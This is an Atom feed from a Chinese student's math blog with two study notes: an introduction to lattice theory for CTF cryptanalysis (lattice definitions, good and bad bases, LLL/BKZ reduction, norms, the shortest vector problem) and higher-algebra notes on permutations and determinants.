<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iyheart的博客</title>
  
  <subtitle>分享笔记和学习历程</subtitle>
  <link href="http://iyheart.github.io/atom.xml" rel="self"/>
  
  <link href="http://iyheart.github.io/"/>
  <updated>2025-09-14T13:55:44.351Z</updated>
  <id>http://iyheart.github.io/</id>
  
  <author>
    <name>iyheart</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>格理论初探</title>
    <link href="http://iyheart.github.io/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/"/>
    <id>http://iyheart.github.io/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/</id>
    <published>2025-09-09T16:19:26.000Z</published>
    <updated>2025-09-14T13:55:44.351Z</updated>
    
    <content type="html"><![CDATA[<ul><li>格理论在密码分析和破解这块是个好工具，而CTF又是偏向解题，在密码学这个方向中其实就是对加密过程和密文以及密钥进行密码分析，发现并破解其中潜在的漏洞。所以对于打CTF来说，格理论是不得不学的一个大方向，使用格能破解一些传统加密。</li><li>格理论除了在密码分析和破解这块起妙用之外，还基于格的几个困难问题设计了一些与格相关的加密（目前我还不知道加密的效率怎么样，有听别人说，但是自己没体会到。）</li><li>其实大二就很想入门格密码学，但是由于时间都花在<code>pwn</code>上，有的时候不仅内耗，还比较浮躁，就导致效率比较低。不过现在大三感觉已经在<code>密码学</code>和<code>pwn</code>这两个方向上已经快突破我的平台期了。大二暑假的时候将初等数论学了个大概（还有指数与原根、连分数、超越数、丢番图，其实原本暑假还打算把抽象代数能学多少就学多少，可惜可惜）。目前有个这么打算<code>高等代数</code>和<code>抽象代数</code>学完，就来学<code>代数数论</code>和<code>解析数论</code>。</li></ul><h1 id="参考资料">参考资料</h1><ul><li><p>对于格理论、格密码来说，国外的资料是一大堆的，国内的资料是真没多少。而国外资料又是<code>英文</code>看一页都老半天了。所以在学习格之前，我就先做了点信息收集。</p></li><li><p>首先是王小云写的一篇论文：<a href="http://www.jcr.cacrnet.org.cn/CN/10.13868/j.cnki.jcr.000002">格密码学研究</a>，这篇论文并不是学格相关的理论知识，当做看小说一样看一遍下来，对格的整个发展有一个比较清晰的脉络。还有就是该论文中引用比较多的论文，可以看看这些引用的论文。通过看该论文，可以大致了解一些格理论的一些专有名词，比如格的困难问题<code>CVP、SVP</code>等，以及一些定理还有格与机器学习的交叉<code>LWE</code>问题。</p></li><li><p>目前找到的一本比较系统的写格理论与格密码的书籍了：<code>格理论与密码学 周福才，徐剑编著</code>，这本数是中文的书籍，字还是可以看得比较顺畅的。</p></li><li><p>还有一本就是涵盖内容比较多的一本英文教材：<code>《COMPLEXITY OF LATTICE PROBLEMS A Cryptographic Perspective》Daniele Micciancio、Shafi Goldwasser著</code></p></li><li><p>国外还有一本书：<code>《AnIntroduction to Mathematical Cryptography》Jeffrey Hoffstein、Jill Pipher、Joseph H. Silverman</code></p></li><li><p>接下来就是一些视频了，这个是英文视频：<a href="https://www.bilibili.com/video/BV1bz411v7pS/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=28578c666061830f05313bc422ef65d5">2012年BIU密码学冬令营-04-Basic Cryptanalysis（中文字幕）_哔哩哔哩_bilibili</a></p></li><li><p>这个是中文的一些教学视频：<a href="https://www.bilibili.com/video/BV1RsFAeWEbF?vd_source=bbdaef564df94fc8991902ba22c6761b">全同态加密理论: 格密码的数学基础</a></p></li><li><p>这个代数数论的视频也有讲一部分格，在第<code>125</code>个视频中：<a href="https://www.bilibili.com/video/BV1e54y1a7dY?p=125&amp;vd_source=bbdaef564df94fc8991902ba22c6761b">经典代数数论2021</a></p></li><li><p><code>《数的几何引论》朱尧辰</code></p></li><li><p>参考博客：<a href="https://dexterjie.github.io/2023/07/28/%E5%88%9D%E8%AF%86%E6%A0%BC/">初识格 | DexterJie’Blog</a></p></li></ul><h1 id="格初步认识">格初步认识</h1><h2 id="格相关概念">格相关概念</h2><ul><li>这一部分主要简述一下通过阅读一些资料对格这个概念的一些初步认识。没啥图片都是文字。</li><li>格密码的发展大体分为两条主线：<ul><li>一是从具有悠久历史的格经典数学问题的研究发展到近30多年来高维格困难问题的求解算法以及其计算复杂性理论研究</li><li>二是从使用格困难问题的求解算法<strong>分析非格公钥密码体制</strong>的安全性发展到基于格困难问题的密码体制的设计。</li></ul></li><li>格的研究源于<code>1611</code>年开普勒提出的如下猜想：在一个容器中堆放等半径的小球所能达到的最大密度为$\frac{\pi}{\sqrt{18}}$。</li><li><code>1840</code>年前后，高斯引入了格的概念并证明了：在三维空间中堆球，如果所有的球心构成一个格，那么堆积密度所能达到知道最大值为$\frac{\pi}{\sqrt{18}}$。</li><li>之后在过去的一个半世纪中，<code>Minkowski</code>、<code>Hermite</code>、<code>Bourgain</code>、<code>Hlawka</code>、<code>Kabatyansky</code>、<code>Levenstein</code>、<code>Lovasz</code>、<code>Mahler</code>、<code>Rogers</code>等著名数学家系统地发展了一般几何体的格堆积与覆盖理论。在这一发展过程中，确定一个几何体的<strong>最大格堆积密度</strong>和<strong>最小格覆盖密度</strong>一直是这一个学科的核心问题。（对与格数学的这个发展过程全部都摘抄自王小云教授）。</li></ul><blockquote><p>首先来了解一下格的定义：格是$\R^m$中一类具有周期性结构的离散点的集合，严格地来说，格是m维欧式空间$\R^m$的$n(m\ge n)$个线性无关向量组$b_1,b_2,…,b_n$的所有整系数线性组合即：<br>$$<br>L(\mathbf{B})={\sum^{n}_{i=1}x_ib_i:x_i\in Z,i=1,…,n}<br>$$<br>向量组$\mathbf{b_1},\mathbf{b_2},…,\mathbf{b_n}$称为格的一组基，<strong>同一个格可以用不同的格基表示</strong>，即存在$y_i,\mathbf{c_i}$使得$L(\mathbf{B})=L(\mathbf{C})$，m称为格的维数，n称为格的秩。满足$m=n$的格称为满秩的。通常研究都是研究<strong>满秩的格</strong>也就是<code>m=n</code>这一情况。</p><p><strong>误区</strong>：对于格的定义来说，我们只规定了$x_i$必须为整数，而$\mathbf{b_i}$向量中的数可以不是整数。而格点其实是格中的向量，由于基向量进行加加减减运算后还是一个向量，这个向量其实是可以用坐标表示的。其几何意义就是从<code>(0,0)</code>通过这个向量指向坐标的一个点。所以<strong>格点其实是格向量</strong></p><p>对于格的定义来说，现在感觉还是很抽象，直接上图直接，对于格来说，其几何意义就是平面上、空间上离散而又规律的点。</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191007867.png" alt="image-20250913191007867"></p><p>而在空间中，也是许许多多有规律的点，在高中化学物质结构中的一些晶体是由原子构成的，都是这么画的有固定，规律的原子排布。（这么一想量子计算机也是从原子等微观角度出发，格是从这些散点出发，二者好像似乎有点联系唉？）</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191251506.png" alt="image-20250913191251506"></p><p><strong>这里还需要注意</strong>：不同的格基，可能生成的是相同的格</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191734643.png" alt="image-20250913191734643"></p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191742382.png" alt="image-20250913191742382"></p><p>注解1：从格的定义出发，如果认真学过线性代数就会发现，这个其实就是线性代数中向量空间基的表达方式。如果使用高中教材向量那一部分来说明的话那其实格的表达其实就相当于向量的一组基底表达。线性代数和高中所学的基底$\vec{c}=x\vec{a}+y\vec{b}$，线性代数的表达就不说了（大一线代没好好学都把时间花在学pwn那边了，所以现在回头再看高等代数。），而线代和高中所学的基底<code>x,y</code>的取值范围都是在实数范围之内的，而格这个定义$x_i\in Z$，说明向量前面的系数是整数。所以格才会是空间中离散的具有周期性的点的集合。</p><p>注解2：从格的引入其实可以知道格与几何关系比较密切；从格的定义来说格又是由向量定义的，向量又与矩阵有关，所以格与线性代数、高等代数关系又非常密切；继续从格的定义来说，基底向量的系数都是整数又彻到整数了，那就和初等数论也扯上关系了。（不知道这算不算强行扯关系，按照自己的理解是这样的）。格与以上的数学分支与基础都有关系，那么绝对与抽象代数也很有关系的。</p><p>注解3：既然格与这么多数学分支有联系，那么这些数学分支中的某些定理都可以使用到格上。而从格的定义使用向量定义并且也可以使用矩阵表示，那么其实矩阵、向量、向量空间的一些性质都<strong>可以使用到格上</strong>。<strong>可以毫不客气地说学格之前先把线性代数学好或者高等代数学好</strong>。</p></blockquote><p>通过对格的逐步了解，了解到了研究个一般研究满秩的格，这里还要做一点说明研究格的这一数学分支似乎被称为<strong>几何数论</strong>，<strong>数的几何引论</strong>，在2025.9.11找到了国内的一本书专门讲几何中的格，也就是传统意义上格用来研究的几何体堆叠问题<code>《数的几何引论》朱尧辰</code></p><blockquote><p><strong>格的基本体(基胞)</strong>：</p><p>格的基本体是由格基向量生成、并作为在$\R^n$中代表每个同余类的一个原胞。若格$\mathbf{L}$由线性无关的基向量$\mathbf{b_1},\mathbf{b_2},…,\mathbf{b_n}$生成即$L(\mathbf{B})={\sum^{n}<em>{i=1}x_ib_i:x_i\in Z,i=1,…,n}$，那么格的基本体则定义为：<br>$$<br>\mathbf{P(B)} ={\sum</em>{i=1}^{n}t_i\mathbf{b_i}|0≤t_i&lt;1}<br>$$<br><strong>误区</strong>：根据基胞的定义，$t_i$是在<code>0~1</code>任意取值的，这就说明，基胞是一个连续的区域，在二维上就是一个平面，在三维上其实就是一个立体图形。而格点或落在平面或者是立体图形的顶点上，并且图形内部是没有格点的。</p><p>如图所示，基胞其实是平行四边形阴影那部分，而格是平行四边形的四个顶点。</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913200242468.png" alt="image-20250913200242468"></p><p>将基胞进行平移整数个单位长度，平行四边形的四个顶点也会被移动到不同的地方，从而构成格。<br><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913200539519.png" alt="image-20250913200539519"></p><p>而到三维或者更高维的立体图形来说，其实可以用化学中物质结构进行类比。晶胞就相当于一个基胞，晶胞顶点上的原子就相当于格点，<strong>相同的基胞构成了晶格</strong>，而<strong>基胞平移会构成格</strong>。</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913200716037.png" alt="image-20250913200716037"></p></blockquote><p>由于研究的一般都是满秩格，而满秩格一般都会有行列式，接下来就需要介绍一下行列式对于格基本体来说的几何意义。</p><blockquote><p><strong>格的行列式的几何意义</strong>：</p><p>格的行列式$del(\mathbf{L})$的值定义为格基本体$\mathbf{P(B)} ={\sum_{i=1}^{n}t_i\mathbf{b_i}|0≤t_i&lt;1}$的有向面积或者说是有向体积。就比如下图，下图中$\mathbf{L} = x_1b_1+x_2b_2,x_1,x_2\in Z$，则$del(\mathbf{L})$的几何意义就是图中平行四边形的面积（但是带有正负号，具体正负要通过右手定则来判断。）</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913201336510.png" alt="image-20250913201336510"></p></blockquote><h2 id="优质基与劣质基">优质基与劣质基</h2><ul><li>给定一组基向量，它可以通过整数倍的加加减减，得到一个格。但是这个基有好坏之分的，如何定义这个基的好坏呢？通过研究就有如下评判基的好坏的标准：</li></ul><blockquote><p>一组基如果很容易能表示出格中所有的点，那么这组基就是优质基。</p><p>一组基如果表示出格中所有的点非常困难，那么这组基就是劣质基。</p><p>注解：由于格是由基的整数倍加加减减，而不是实数倍加加减减，这就导致了对于有些基来说，表示一个靠近原点的格点，都需要<code>10000000v+20000000u</code>这么大的一个系数，也就是说有些格点非常难表示出来。</p></blockquote><ul><li>我们此时已经给优质基和劣质基下了一个定义，那么就我们就需要研究这两种基有什么特征（这样才能一看图片或者一把这一组基从图中画出来就能判断它是优质基还是劣质基了）。研究优质基和劣质基得到了如下特点：</li></ul><blockquote><p>劣质基具有的特点：</p><ol><li>长度差异非常大：基向量有的长度非常长、有的长度又非常短</li><li>基向量夹角接近共线：基向量之间的夹角接近共线，可以是非常接近<code>0°</code>，也可以是非常接近<code>180°</code></li></ol><p>优质基具有的特点：</p><ol><li>长度差异非常小：基向量的长度都大概差不多</li><li>基向量夹角接近正交：基向量之间的夹角接近<code>90°</code></li></ol></blockquote><ul><li>给出一个图所示：</li></ul><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914211846300.png" alt="image-20250914211846300"></p><ul><li>优质基生成的格，最典型的优质基其实就是正交向量</li></ul><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914211917982.png" alt="image-20250914211917982"></p><h2 id="格基规约">格基规约</h2><ul><li>格基规约其实又被称为格基减约，它的英文称为<code>Lattice Basis Reduction</code>，这里就先简单了解一下格基规约的一个概念。</li></ul><blockquote><p>格基规约，都出现了<code>格基</code>了，那么肯定是对表示格的基向量做的操作。由于之前已经有说明了，一个格可以使用不同的基表示。而基有优质基和劣质基之分。那么给定一个劣质基表示的格，其实可以通过某种方法将该格使用优质基表示。</p><p>所以<strong>格基规约</strong>做了这么一件事情：将劣质基转换为优质基，并且俩个基表示的仍然是同一个格，这个操作就被称为格基规约。</p></blockquote><ul><li>对于格基规约来说，目前有俩个比较著名的算法即：LLL算法<code> Lenstra–Lenstra–Lovász lattice basis reduction</code>，BKZ算法<code> Block Korkine-Zolotarev lattice reduction</code></li></ul><h2 id="范数距离">范数(距离)</h2><ul><li>范数其实就指的是距离，从初一开始接触绝对值，一直到学了勾股定理之后得到了求平面直角坐标系两点之间的距离的方法。这其实就是最经典的<code>欧几里得距离</code>。<strong>对于后面所说的向量长度、距离等指的一般都是欧几里得距离</strong></li></ul><p>$$<br>AB = \sqrt{(x_A-x_B)^2+(y_A-y_B)^2}<br>$$</p><ul><li>然后到高中一些奇奇怪怪的题，接触到了曼哈顿距离：</li></ul><p>$$<br>AB = |x_A-x_B|+|y_A-y_B|<br>$$</p><ul><li>到了大学，在学习线性代数或者高等代数的时候，给距离取了一个新的名称<code>范数</code>英文名称为<code>norm</code>，并且给距离下了一个比较统一的定义：</li></ul><p>$$<br>||\mathbf{x}||<em>p=(\sum</em>{i=1}^{n}x^{p}_i)^{\frac{1}{p}}<br>$$</p><ul><li>对于曼哈顿距离，其实就是<code>p=1</code>的情况：</li></ul><p>$$<br>||\mathbf{x}||<em>1=\sum</em>{i=1}^{n}|x_i|<br>$$</p><ul><li>对于欧几里得距离<code>欧几里得范数</code>，其实就是<code>p=2</code>的情况：</li></ul><p>$$<br>||\mathbf{x}||<em>2 = \sqrt{&lt;\mathbf{x},\mathbf{x}&gt;}=\sqrt{\sum^{n}</em>{i=1}x_i^{2}}<br>$$</p><ul><li>还有一种极限的情况如公式如下所示：</li></ul><p>$$<br>||\mathbf{x}||<em>{\infty}=\lim</em>{p \to \infty}||\mathbf{x}||<em>p=\max^{n}</em>{i=1}|x_i|<br>$$</p><h1 id="格的基本问题">格的基本问题</h1><h2 id="最短向量问题svp">最短向量问题(SVP)</h2><blockquote><p>最短向量问题<code>Short Vector Problem,SVP</code>：给定格$\mathbf{L}$，找一个非零格向量$\mathbf{v}$，满足对任意非零向量$\mathbf{u}\in \mathbf{L}$，有$||\mathbf{v}||≤||\mathbf{u}||$。</p><p>注解1：是给定一个格找它的最短向量，而不是给定一组基向量找它的最短向量，只不过我们使用一组基向量来描述整个格。</p><p>注解2：最短向量问题所描述的找一个<code>非零格向量</code>，这个向量有特地说明是<code>格向量</code>（格向量其实就是用基表示出来的，在图中其实就是格点）。也就是说，我们需要寻找的就是给定格中的一个点（也就是格向量），使得对于其他格$\mathbf{L}$的向量来说满足$||\mathbf{v}||≤||\mathbf{u}||$。</p><p>注解3：有时候<strong>最短向量不唯一</strong>，可能有多个。但是最短向量是<strong>成对出现的</strong>，因为如果找到了一个最短向量，那么它的相反向量其实也是一个最短向量。</p><p>注解4：对于一组优质基，该基向量中的其中一个向量很可能就是一个最短向量。对于一组劣质基，该基向量中的一个向量大概率都不是最短向量</p><p><strong>几何理解</strong>：这里直接给出二维的平面图来说明，SVP在二维上可以使用几何来理解。其实就是找到一个格点，以该格点与原点的距离为半径，以原点为圆心，画出一个圆。这个圆满足如下两个条件：</p><ol><li>该圆的内部除了原点外，不能有其他格点</li><li>格点要么在该圆的圆外，要么在该圆的圆上，而在圆上的点其实就是我们要找的最短向量。</li></ol><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914203603318.png" alt="image-20250914203603318"></p><p>有的时候一个格的最短向量并不唯一</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914204048964.png" alt="image-20250914204048964"></p><ul><li>下面这个是劣质基寻找最短向量的一个例图</li></ul><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914205647979.png" alt="image-20250914205647979"></p></blockquote><p>类比：个人感觉找最短向量问题有点和寻找模意义下的指数有点像。（好像更准确的来说是寻找模意义下给定一个底数，求这个底数的模幂运算的阶？）</p><h2 id="r-近似最短向量问题r-svp">r-近似最短向量问题(r-SVP)</h2>]]></content>
    
    
    <summary type="html">前言：非常想入门格</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="格密码理论" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%A0%BC%E5%AF%86%E7%A0%81%E7%90%86%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>高等代数-行列式</title>
    <link href="http://iyheart.github.io/2025/09/09/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/"/>
    <id>http://iyheart.github.io/2025/09/09/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/</id>
    <published>2025-09-09T04:52:15.000Z</published>
    <updated>2025-09-09T08:08:47.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="行列式的引入">行列式的引入</h1><ul><li>前面阶梯形矩阵提供了判断方程组的解的办法，但是求出一个矩阵的阶梯形矩阵几乎都已经将方程解出来了，那还要判断方程组的解干嘛。</li><li>所以<strong>为了更容易的得出一个方程组解的情况</strong>，这个时候就需要先利用矩阵去研究了。先来研究二元一次方程组，该方程组如下，其中$a_{11}、a_{21}$不全为0,那不妨设$a_{11}\not=0$。</li></ul><p>$$<br>\begin{cases}<br>a_{11}x_1+a_{12}x_2&amp;=b_1\<br>a_{21}x_1+a_{22}x_2&amp;=b_2\<br>\end{cases}<br>$$</p><ul><li>将它化成增广矩阵后就如下图所示：</li></ul><p>$$<br>\begin{bmatrix}<br>a_{11}&amp;a_{12}&amp;b_1\<br>a_{21}&amp;a_{22}&amp;b_2<br>\end{bmatrix}<br>$$</p><ul><li>​使用初等行变换就转化成了阶梯形矩阵，通分一下，就会出现两种情况：</li></ul><p>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; b_1\<br>0&amp;a_{22}-\frac{a_{21}}{a_{11}}a_{12}&amp;b_2-\frac{a_{21}}{a_{11}}b_1<br>\end{bmatrix}\<br>\Rightarrow<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; b_1\<br>0&amp;\frac{a_{11}a_{22}-a_{21}a_{12}}{a_11}&amp;b_2-\frac{a_{21}}{a_{11}}b_1<br>\end{bmatrix}<br>$$</p><ul><li>情况1：$a_{11}a_{22}-a_{12}a_{21}\not=0$，此时根据上一章方程组解的情况就可以得到该方程有唯一解：</li></ul><p>$$<br>(\frac{b_1a_{22}-b_2a_{12}}{a_{11}a_{22}-a_{12}a_{21}},\frac{a_{11}b_2-a_{21}b_1}{a_{11}a_{22}-a_{12}a_{21}})<br>$$</p><ul><li>情况2：$a_{11}a_{22}-a_{12}a_{21}=0$，此时原方程组无解或者有无穷多个解。</li></ul><blockquote><p><strong>行列式</strong>：</p><p>此时对于$a_{11}a_{22}-a_{12}a_{21}$就使用如下的一个记号，矩阵2级矩阵$\mathbf{A}$的行列式，记作$|A|$或者$det\mathbf{A}$：<br>$$<br>\begin{vmatrix}<br>a_{11} &amp; a_{12} \<br>a_{21} &amp; a_{22}<br>\end{vmatrix}=a_{11}a_{22}-a_{12}a_{21}<br>$$<br>注解：行列式是一个数</p><p><strong>命题1</strong>：</p><p>两个方程的二元一次方程组有唯一解的充分必要条件是：它的系数矩阵$\mathbf{A}$的行列式(简称为<strong>系数行列式</strong>)$|A|\not=0$，此时它的唯一解是：<br>$$<br>(\frac{b_1a_{22}-b_2a_{12}}{a_{11}a_{22}-a_{12}a_{21}},\frac{a_{11}b_2-a_{21}b_1}{a_{11}a_{22}-a_{12}a_{21}})’<br>$$</p></blockquote><h1 id="n元排列">n元排列</h1><blockquote><p><strong>定义1</strong>：</p><p><code>1,2,...,n</code>的一个全排列称为一个n元排列（或n个不同正整数的全排列称为一个n元排列），而<code>1,2,...,n</code>形成的n元排列有<code>n!</code>个，例如：<code>3</code>元排列有<code>123,132,213,231,312,321</code></p><p><strong>定义2</strong>：</p><p>对于一个四元排列<code>2431</code>，从左到右数，顺序（从小到大）的数对有：<code>24</code>、<code>23</code>。从左到右数，逆序（从大到小）的数对有：<code>21,43,41,31</code>。像这样在一个<code>n</code>元排列中<strong>逆序的数对的数目称为逆序数</strong>，记作$\tau(2431)=4$</p><p><strong>定义3</strong>：</p><p>逆序数是偶数的排列称为<strong>偶排列</strong>。</p><p>逆序数是奇数的排列称为<strong>奇排列</strong>。</p><p><strong>定义4</strong>：</p><p>将<code>2431</code>的<code>4</code>和<code>1</code>交换位置，使其变成<code>2134</code>的这个操作称为<strong>对换</strong>，记作$(4,1)$。</p></blockquote><blockquote><p><strong>定理1</strong>：</p><p>对换改变n元排列的奇偶性</p><p><strong>定理2</strong>：</p><p>任一n元排列与排列<code>123...n</code>可以经过一系列对换互变，并且所作对换的次数与这个n元排列有相同的奇偶性。</p></blockquote><h1 id="n阶行列式">n阶行列式</h1><blockquote><p><strong>定义1</strong>：</p><p>n阶行列式$\begin{vmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n} \…&amp;…&amp;…&amp;…\ a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}$是<code>n!</code>项的代数和，其中每一项是不同行，不同列的n个元素的乘积，每一项按行指标成自然序排好位置，当列指标形成的排列是偶排列时，该项带正号，当列指标形成的排列是奇排列，该项带负号。</p><p>$\begin{vmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n}\…&amp;…&amp;…&amp;…\ a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=\sum_{j_1j_2…j_n}(-1)^{\tau(j_1j_2…j_n)}a_{1j_1}a_{2j_2}…a_{nj_n}$。行列式其实是右边这个求和表达式的一个简洁记号。</p><p><strong>定义2</strong>：</p><p>n阶行列式$\begin{vmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n} \…&amp;…&amp;…&amp;…\ a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}$也称为n阶矩阵$\mathbf{A}=\begin{bmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\a_{21}&amp;a_{22}&amp;…&amp;a_{2n}\…&amp;…&amp;…&amp;…\a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{bmatrix}$的行列式，记作$|\mathbf{A}|$，$det\mathbf{A}$，简记成$\mathbf{A}=(a_{ij})$其中$a_{ij}$为A的$(i,j)$元</p><p><strong>定义3</strong>：上三角形行列式</p><p>主对角线下方元素全为0的n阶行列式称为上三角形行列式。（下三角形行列式：主对角线上方的元素全为0的n阶行列式）<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1,n-1}&amp;a_{1,n}\<br>0&amp;a_{22}&amp;…&amp;a_{2,n-1}&amp;a_{2,n}\<br>0&amp;0&amp;a_{33}&amp;…&amp;a_{3,n}\<br>…&amp;…&amp;…&amp;…&amp;…\<br>0&amp;0&amp;…&amp;a_{n-1,n-1}&amp;a_{n-1,n}\<br>0&amp;0&amp;…&amp;0&amp;a_{n,n}<br>\end{vmatrix}<br>$$</p></blockquote><blockquote><p>一些行列式的计算：</p><p><strong>一阶行列式</strong>：</p><p>$|a|=a$</p><p><strong>二阶行列式</strong>：</p><p>$\begin{vmatrix}a_{11}&amp;a_{12}\ a_{21}&amp;a_{22}\end{vmatrix}=a_{11}a_{22}-a_{12}a_{21}$</p><p><strong>三阶行列式</strong>：</p><p>三元排列偶排列：<code>123,231,312</code></p><p>三元排列奇排列：<code>132,213,321</code></p><p>$\begin{vmatrix}a_{11}&amp;a_{12}&amp;a_{13}\ a_{21}&amp;a_{22}&amp;a_{23}\ a_{31}&amp;a_{32}&amp;a_{33}\end{vmatrix}=a_{11}a_{22}a_{33}+a_{12}a_{23}a_{31}+a_{13}a_{21}a_{32}-a_{11}a_{23}a_{32}-a_{12}a_{21}a_{33}-a_{13}a_{22}a_{31}$</p><p><strong>上三角形行列式</strong>：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1,n-1}&amp;a_{1,n}\<br>0&amp;a_{22}&amp;…&amp;a_{2,n-1}&amp;a_{2,n}\<br>0&amp;0&amp;a_{33}&amp;…&amp;a_{3,n}\<br>…&amp;…&amp;…&amp;…&amp;…\<br>0&amp;0&amp;…&amp;a_{n-1,n-1}&amp;a_{n-1,n}\<br>0&amp;0&amp;…&amp;0&amp;a_{n,n}<br>\end{vmatrix}=a_{11}a_{22}…a_{nn}<br>$$<br>命题1：上三角形行列式的值等于它的主对角线上n个元素的乘积。</p></blockquote><h1 id="行列式的性质">行列式的性质</h1><blockquote><p><strong>定义1</strong>：矩阵的转置</p><p>设n阶矩阵$\mathbf{A}=(a_{i,j})=\begin{bmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n}\…&amp;…&amp;…&amp;…\ 